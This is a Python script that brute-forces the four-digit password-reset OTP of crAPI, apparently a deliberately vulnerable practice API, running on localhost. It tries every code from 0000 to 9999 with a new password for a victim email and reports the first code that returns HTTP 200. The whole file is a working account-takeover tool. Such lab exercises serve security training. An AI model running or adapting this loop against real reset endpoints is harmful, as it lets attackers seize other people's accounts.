#!/usr/bin/env python3

import requests
import sys
from time import sleep

# ==========================================================
#           crAPI OTP Tester
#           Author: ABDULMUIZ
# ==========================================================

BANNER = r"""
==============================================================
   █████╗ ██████╗ ██████╗ ██╗   ██╗██╗
  ██╔══██╗██╔══██╗██╔══██╗██║   ██║██║
  ███████║██████╔╝██║  ██║██║   ██║██║
  ██╔══██║██╔══██╗██║  ██║██║   ██║██║
  ██║  ██║██████╔╝██████╔╝╚██████╔╝███████╗
  ╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝

        crAPI OTP Testing Utility
              Author: ABDULMUIZ
==============================================================
"""

print(BANNER)

URL = "http://localhost:8888/identity/api/auth/v2/check-otp"

EMAIL = "adam007@example.com"
PASSWORD = "Hacked123!"

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "Origin": "http://localhost:8888",
    "Referer": "http://localhost:8888/forgot-password",
}

SESSION = requests.Session()

print("[*] Starting OTP test...")
print(f"[*] Target : {URL}")
print(f"[*] Email  : {EMAIL}")
print("-" * 60)

for i in range(10000):
    otp = f"{i:04d}"

    payload = {
        "email": EMAIL,
        "otp": otp,
        "password": PASSWORD
    }

    try:
        r = SESSION.post(
            URL,
            headers=HEADERS,
            json=payload,
            timeout=5
        )

        print(f"\r[*] Testing OTP: {otp}", end="", flush=True)

        # Adjust this logic depending on how your crAPI lab responds.
        if r.status_code == 200:
            print("\n")
            print("=" * 60)
            print("[+] Possible valid OTP found!")
            print(f"[+] OTP: {otp}")
            print(f"[+] HTTP Status: {r.status_code}")
            print("=" * 60)
            print(r.text)
            sys.exit(0)

    except requests.exceptions.RequestException as e:
        print(f"\n[!] Request failed: {e}")
        sleep(1)

print("\n")
print("[-] Completed. No successful OTP found.")
